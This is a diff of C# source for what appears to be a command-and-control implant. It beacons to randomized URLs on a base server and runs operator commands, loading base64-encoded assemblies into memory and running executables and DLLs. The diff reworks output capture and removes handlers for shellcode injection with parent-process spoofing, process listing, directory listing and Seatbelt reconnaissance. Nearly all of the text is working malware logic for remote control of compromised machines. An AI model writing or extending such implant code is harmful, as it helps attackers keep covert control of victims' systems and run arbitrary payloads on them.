@@ -297,7 +297,8 @@ public class Program
     {
       beacontime = 5;
     }
-    
+    var strOutput = new StringWriter();
+    Console.SetOut(strOutput);
   	while(true)
   	{
     	Random rnd = new Random();
@@ -329,45 +330,11 @@ public class Program
             output = "";
             //add download-file
             //add upload-file
-            //add implant-core features, screenshot, etc
-
-            if (c.ToLower() == "pwd") {
-              output =  Directory.GetCurrentDirectory();
-            }
-            
-            if (c.ToLower().StartsWith("dir") || c.ToLower().StartsWith("ls")){
-              string dirPath = "";
-              var stringOutput = new StringWriter();
-	            Console.SetOut(stringOutput);
-              if (c.ToLower() == "dir" || c.ToLower() == "ls") {
-                dirPath = Directory.GetCurrentDirectory();
-              } else {
-                dirPath = Regex.Replace(c, "dir ", "", RegexOptions.IgnoreCase);
-                dirPath = Regex.Replace(c, "ls ", "", RegexOptions.IgnoreCase);
-              }
-              Console.WriteLine("Directory listing: {0} \r\n", dirPath);
-              string[] folderPaths = Directory.GetDirectories(dirPath, "*", SearchOption.TopDirectoryOnly);
-            	foreach (var f in folderPaths)
-            	{
-                try {
-                Console.WriteLine("d-----  {0}", f.Normalize());
-                }
-                catch {}
-            	}
-              string[] filePaths = Directory.GetFiles(dirPath, "*", SearchOption.TopDirectoryOnly);
-            	foreach (var f in filePaths)
-            	{
-                try {
-                Console.WriteLine("------  {0}", f.Normalize());
-                }
-                catch {}
-            	}
-              output = stringOutput.ToString();
-            }
                       
             if (c.ToLower().StartsWith("loadmodule")){
 	            string module = Regex.Replace(c, "loadmodule", "", RegexOptions.IgnoreCase);
               Assembly assembly = System.Reflection.Assembly.Load(System.Convert.FromBase64String(module));
+              output += "Module loaded sucessfully";
             }
             
             if (c.ToLower().StartsWith("listmodules")){
@@ -384,33 +351,7 @@ public class Program
               sc = sc.Replace("\"", "");
               scode = sc;
             }
-            
-            if (c.ToLower().StartsWith("inject-shellcode")){
-              
-              string newProc = Regex.Replace(c, "inject-shellcode ", "", RegexOptions.IgnoreCase);
-              newProc = Regex.Replace(newProc, "inject-shellcode", "", RegexOptions.IgnoreCase);
-              if (!String.IsNullOrEmpty(newProc) && newProc.Length > 5) {
-                 Program.proc = newProc;
-              }
-                            
-              var stringOutput = new StringWriter();
-              Console.SetOut(stringOutput);
-              byte[] payload = Convert.FromBase64String(Program.scode);
-              
-              var loadedType = LoadSomething("PPIDSpoofer, Inject, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
-              uint procID = (uint)loadedType.Assembly.GetType("PPIDSpoofer").InvokeMember("SharpCreateProcess", BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] {  null, Program.proc, true}, null, null, null);
-              var procShellcode = loadedType.Assembly.GetType("PPIDSpoofer").InvokeMember("InjectShellcode", BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] {  (int)procID, payload}, null, null, null);
-              output = stringOutput.ToString();
-            
-            }
-
-            if (c.ToLower() == "ps"){
-              var loadedType = LoadSomething("ProcHandler, Get-ProcessList, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
-              var xxx = loadedType.Assembly.GetType("ProcHandler").InvokeMember("GetProcesses", BindingFlags.InvokeMethod, null, null, null);
-              output = xxx.ToString();
-            }
-          
-            // run loaded assemblies
+                    
             if (c.ToLower().StartsWith("run-exe")){
               string[] splitargs = c.Split(new string[] {" "}, StringSplitOptions.RemoveEmptyEntries);
               int i = 0;
@@ -441,22 +382,15 @@ public class Program
             	{
             		if (Ass.FullName.ToString().ToLower().StartsWith(name.ToLower()))
             		{
-            			var stringOutput = new StringWriter();
-            			Console.SetOut(stringOutput);
             			var loadedType = LoadSomething(qualifiedname + ", " + Ass.FullName);
                   try {
                       var xxx = loadedType.Assembly.EntryPoint.Invoke(null, new object[] { myList.ToArray() });
-                      output = xxx.ToString() + stringOutput.ToString();
-                  } catch (Exception e)  {
-                      output = stringOutput.ToString();
-                      //var xxx = e;
-                      //output = xxx.ToString() + stringOutput.ToString();
-                  }
+                      output = xxx.ToString();
+                  } catch  {  }
             		}
             	}
             }
 
-            // run loaded assemblies
             if (c.ToLower().StartsWith("run-dll")){
               string[] splitargs = c.Split(new string[] {" "}, StringSplitOptions.RemoveEmptyEntries);
               string qualifiedname = splitargs[1];
@@ -481,18 +415,6 @@ public class Program
             	}
             }
             
-            // try to load another app domain and unload each time
-            if (c.ToLower().StartsWith("loadmodule-appdomain")){
-              var stringOutput = new StringWriter();
-	            Console.SetOut(stringOutput);
-	            string module = Regex.Replace(c, "loadmodule", "", RegexOptions.IgnoreCase);
-              AppDomain dom = AppDomain.CreateDomain("RANDOM");
-              Assembly assembly = dom.Load(System.Convert.FromBase64String(module));
-              var pop = assembly.GetType("Seatbelt.Program").InvokeMember("UserChecks", BindingFlags.InvokeMethod, null, null, null);
-              output = stringOutput.ToString();
-              AppDomain.Unload(dom);
-            }
-  
             if (c.ToLower().StartsWith("exit")){
                 System.Environment.Exit(1);
             }
@@ -552,6 +474,9 @@ public class Program
             	}
             }
 
+            output += strOutput.ToString();
+            StringBuilder sb = strOutput.GetStringBuilder();
+            sb.Remove(0, sb.Length);
             URL = stringnewURLS[rnd.Next(stringnewURLS.Length)];
             G = (Guid.NewGuid()).ToString();
         		URL = baseURL+"/"+URL+G+"/?"+RandomURI;
